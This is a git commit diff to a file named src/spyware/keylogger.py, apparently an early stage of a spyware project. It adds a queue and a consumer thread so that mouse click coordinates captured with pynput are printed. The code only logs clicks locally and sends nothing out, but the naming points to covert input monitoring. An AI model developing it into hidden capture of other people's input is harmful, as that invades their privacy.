b93ea125011e48883f7f5ed27a3f73cc7cd79a76
Szymon Cader <szymon.sc.cader@gmail.com>
2024-12-14 14:31:01 +0100

    Add thread for consuming events

--- src/spyware/keylogger.py
+++ src/spyware/keylogger.py
@@ -1,6 +1,9 @@
+import threading
 import time
-
+from queue import Queue
 from pynput import mouse
+
+queue = Queue()
 
 def on_move(x, y):
     print('Pointer moved to {0}'.format(
@@ -10,27 +13,41 @@ def on_click(x, y, button, pressed):
     print('{0} at {1}'.format(
         'Pressed' if pressed else 'Released',
         (x, y)))
-    if not pressed:
-        # Stop listener
-        return False
+    if pressed:
+        queue.put((x, y))
+    #     # Stop listener
+    #     return False
 
 def on_scroll(x, y, dx, dy):
     print('Scrolled {0} at {1}'.format(
         'down' if dy < 0 else 'up',
         (x, y)))
 
+
+def periodic_print():
+    while True:
+        element = queue.get()
+        print("Processed", element, "click")
+        # print('Press Ctrl+C to exit')
+        # time.sleep(1)
+
 # Collect events until released
 if __name__ == '__main__':
-    with mouse.Listener(
-            on_move=on_move,
-            on_click=on_click,
-            on_scroll=on_scroll) as listener:
-        listener.join()
+    # with mouse.Listener(
+    #         on_move=on_move,
+    #         # on_click=on_click,
+    #         on_scroll=on_scroll) as listener:
+    #     listener.join()
 
     # ...or, in a non-blocking fashion:
-    # listener = mouse.Listener(
-    #     on_move=on_move,
-    #     on_click=on_click,
-    #     on_scroll=on_scroll)
-    # listener.start()
+    listener = mouse.Listener(
+        # on_move=on_move,
+        on_click=on_click,
+        # on_scroll=on_scroll
+    )
+    listener.start()
+    consumer = threading.Thread(target=periodic_print)
+    consumer.start()
+    listener.join()
+    consumer.join()
     # time.sleep(100)
